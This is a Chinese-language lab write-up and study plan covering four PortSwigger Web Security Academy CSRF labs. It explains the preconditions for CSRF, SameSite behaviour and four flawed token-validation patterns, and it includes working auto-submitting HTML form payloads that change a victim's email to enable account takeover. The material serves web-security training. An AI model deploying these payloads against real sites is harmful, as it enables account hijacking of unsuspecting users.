# Day 1 · CSRF 原理与三个"经典缺陷"（3 h）

> 目标：搞懂 CSRF 成立的三要素，跑通 exploit server 的投递闭环，拿下 4 个 Apprentice。
> 主题词：**身份由 Cookie 决定，动作由参数决定，参数可预测 → 就能替受害者按按钮。**

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:40 | CSRF 三要素、SameSite 现状、exploit server 工作流 | 一页原理笔记 |
| 00:40–01:00 | Lab 1 无防护 | 第一个 PoC |
| 01:00–01:20 | Lab 2 方法依赖 | 表单改 GET |
| 01:20–01:40 | Lab 3 参数存在性依赖 | 删参数 |
| 01:40–02:10 | Lab 4 令牌不绑 session | 跨账号令牌复用 |
| 02:10–02:40 | 归纳"令牌校验的 5 种写法 → 5 种绕过" | 矩阵初稿 |
| 02:40–03:00 | 从零重打 Lab 3、Lab 4（不看笔记） | 肌肉记忆 |

---

## 0. 原理：三要素缺一不可

一个动作能被 CSRF，必须同时满足：

1. **有意义的动作** —— 改邮箱、改密码、转账、加管理员。改邮箱最经典，因为改完可以走"忘记密码"接管账号。
2. **只靠 Cookie 认身份** —— 请求里没有任何攻击者猜不出的东西。
3. **参数可预测** —— 攻击者能构造出完整请求体。

所以防御只有一条主干：**在请求里塞一个攻击者拿不到、且和当前会话绑定的值**（CSRF token），或者让浏览器在跨站时根本不带 Cookie（SameSite）。

### 关于 SameSite：为什么这些 lab 还能打

Chrome 从 2021 起把未声明 `SameSite` 的 Cookie 当 `Lax` 处理，而 `Lax` 只允许**顶层导航的 GET** 带 Cookie，跨站 POST 一律不带。

那为什么 lab 里跨站 POST 还能成功？因为 PortSwigger 的靶场把 session cookie 显式设成了 `SameSite=None`（配合 `Secure`），模拟"老站点 + 宽松配置"。

**这条必须记住**：真实目标上，先看响应头 `Set-Cookie` 里有没有 `SameSite`。没有声明 ≠ 没有限制，现代浏览器会替你上 `Lax`。这也是为什么 Day 2 里 Lab 5/6 必须往注入的 Cookie 上补 `; SameSite=None`——否则浏览器会拒绝保存或拒绝回传。

### exploit server 工作流（每天都要用 5 次以上）

1. 进 lab → 右上角 **Go to exploit server**。
2. `Body` 里贴 HTML → **Store**。
3. **View exploit**（用你自己的浏览器验证一次，看邮箱是否真的变了）。
4. **Deliver exploit to victim**（把页面投给模拟受害者）。
5. 抬头看 lab 横幅是否变 **Solved**。

三个固定坑：

- 改完不 Store 就 Deliver → 投的是旧页面。
- 一个 lab 只能成功 Deliver 一次有效载荷；失败要等几秒再投，且**每次都要重新 Store**。
- 先用 View exploit 自测：邮箱必须真的变，否则说明 payload 本身有问题，别浪费 Deliver。

---

## Lab 1 · CSRF vulnerability with no defenses（Apprentice / 20 min）

### 一句话
没有任何防护：只要能构造出那个 POST，就赢了。

### 观察
登录 `wiener:peter` → **My account** → 改邮箱 → Burp 里看到：

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

email=wiener%40normal-user.com
```

请求体里只有 `email`，没有 token，没有 referer 校验，没有确认密码。

### 攻击
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

Store → View exploit（自己的邮箱变成 `pwned@evil-user.net`）→ Deliver → Solved。

### 为什么有效
服务端只做两件事：从 `session` cookie 取用户 ID，把 body 里的 `email` 写进库。请求里每一个字节攻击者都能预测，浏览器又会自动附加受害者的 `session`。

### 坑
- 邮箱写成和当前相同（`wiener@normal-user.com`）时，页面可能判定"无变化"而不报错，误以为 PoC 失败。
- 忘了 `method="POST"`，默认 GET，服务端 405。
- Community 版没有 *Generate CSRF PoC*，手写这 6 行即可，别去找插件。

### 带走
**CSRF 的默认形态是"零防护"，不是"绕过防护"。** 真实目标里先找那些"只靠 Cookie 认身份 + 参数固定"的接口：改邮箱、改昵称、绑定第三方账号、取消订阅、加购物车结算。

---

## Lab 2 · Validation depends on request method（Apprentice / 20 min）

### 一句话
token 只在 POST 分支校验，把请求改成 GET 就绕过了。

### 观察
正常改邮箱的请求带 `csrf=<32位>`。把它改成 GET 试试：

```http
GET /my-account/change-email?email=test%40test.com HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
```

响应 302 且邮箱真的变了——**GET 分支没有校验 token**。

这是典型的"框架默认行为"：`@PostMapping` 上加了 CSRF 校验拦截器，`@GetMapping` 没加；或者校验代码写死在 `if (request.getMethod().equals("POST"))` 里。

### 攻击
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

`<form>` 不写 `method` 就是 GET，参数自动进 query string，服务端照收。

### 坑
- 一开始试图把 body 当 GET 发（`GET` + `Content-Type: x-www-form-urlencoded` + body），Spring 不认，必须放 query string。
- 这不是"GET 也能改状态"的 REST 洁癖问题，而是**校验分支漏了**。两者要分开记：前者是设计问题，后者才是绕过点。

### 带走
看到 token 校验，先做最小扰动实验：**改方法、删参数、改 Content-Type、加 `_method`、加 `X-HTTP-Method-Override`**。四种都试一遍只要 2 分钟。

---

## Lab 3 · Validation depends on token being present（Apprentice / 20 min）

### 一句话
token 存在才校验，不存在就跳过——把整个参数删掉。

### 观察
正常请求：

```http
POST /my-account/change-email HTTP/1.1
...
csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener%40normal-user.com
```

手工删掉 `csrf=...&`（**连参数名一起删**），只留 `email=`，重放 → 邮箱照样被改。

### 攻击
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>document.forms[0].submit();</script>
```

对比 Lab 1：**payload 一模一样**，区别只在服务端逻辑。所以 Lab 1 是"无防护"，Lab 3 是"有防护但可空过"——从攻击面看它们是同一个 PoC。

### 为什么有效
服务端写成了"permissive"逻辑：

```java
String csrf = request.getParameter("csrf");
if (csrf != null) {           // 存在才校验
    if (!csrf.equals(session.getCsrf())) throw new InvalidCsrf();
}
```

空值（`csrf=`）和缺失（没有这个参数）行为不同，这个 lab 特意要求**整个参数不存在**。

### 坑
- 只把值清空（`csrf=`）会 400，因为空串进了校验分支且不匹配。
- 用 Burp 的 "Change body encoding" 之类的功能容易把参数顺序搞乱，直接手改 raw 最稳。

### 带走
真实代码里这种写法极多：`if (token != null && !token.isEmpty())`。测试手法固定为三个变体：**删参数 / 空值 / 垃圾值**，三种结果往往不同。

---

## Lab 4 · Token is not tied to user session（Apprentice / 30 min）

### 一句话
token 是"全局池"里的合法值，只要在池子里，谁的会话都能用。

### 观察
- 用自己的账号 `wiener:peter` 登录，打开 `/my-account`，页面里的隐藏域 `csrf=<TOKEN_A>`。
- 把 `csrftoken` 换成另一个账号拿到的 token，POST 依然成功 → 说明服务端只校验"这个 token 我发过"，没校验"这个 token 发给谁"。

### 攻击（两步）
1. 用 `wiener` 登录，复制 `/my-account` 里的 `csrf` 值，记为 `TOKEN_A`。
2. 构造：

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net">
  <input type="hidden" name="csrf" value="TOKEN_A">
</form>
<script>document.forms[0].submit();</script>
```

Deliver → 受害者的邮箱被改 → Solved。

### 为什么有效
防护退化成了"防重放"而不是"防伪造"：token 确实不可预测，但它不与 `session` 绑定。攻击者只要有一个自己的账号，就拿到了万能钥匙。

正确实现是 `token = HMAC(session_id, secret)` 或服务端 `token → session_id` 映射，校验时必须比对当前会话。

### 坑
- 别去"偷"受害者的 token（那需要 XSS）。这个 lab 的关键是**用你自己的 token 打受害者**，很多人卡在这里以为要想办法读受害者页面。
- 一定要检查 lab 里 `wiener` 和受害者的 token 是否真的不同——如果相同，说明实例状态异常，重开 lab。

### 带走
判断标准一句话：**"我自己的 token 能不能打别人？"** 能，就是未绑定会话。真实目标里常见于：token 存全局 Map、token 用时间戳/随机数但不落会话、多套框架各发各的 token。

---

## 当日复盘

### 四个 lab 的差别只在服务端一行代码

| Lab | 服务端逻辑 | 绕过动作 |
|-----|-----------|----------|
| 1 | 什么都不校验 | 直接构造 POST |
| 2 | `if (method == POST) validate()` | 改 GET |
| 3 | `if (token != null) validate()` | 删参数 |
| 4 | `if (token in globalPool) ok` | 用攻击者自己的 token |

**攻击载荷几乎是同一个**：一个 action 指向靶场、隐藏域里塞 `email` 的 form + 自动提交。CSRF 这个主题 80% 的功夫在"读懂服务端校验分支"，不在写 HTML。

### 三个问题自测
1. 为什么 Lab 4 里攻击者不需要看到受害者的 CSRF token？
2. 如果站点把 session cookie 设成 `SameSite=Lax`，Lab 1 的 PoC 还能成功吗？为什么？
3. Lab 2 和"GET 请求改状态"这个设计问题，是不是同一件事？

### 明日预告
Day 2 进入 Practitioner：token 绑在**非 session 的 Cookie** 上、token **双提交**、以及 Referer 校验的两种绕过。核心新工具是 **CRLF 注入改 Cookie**（`Set-Cookie` 反射）和 `<meta name="referrer">`。
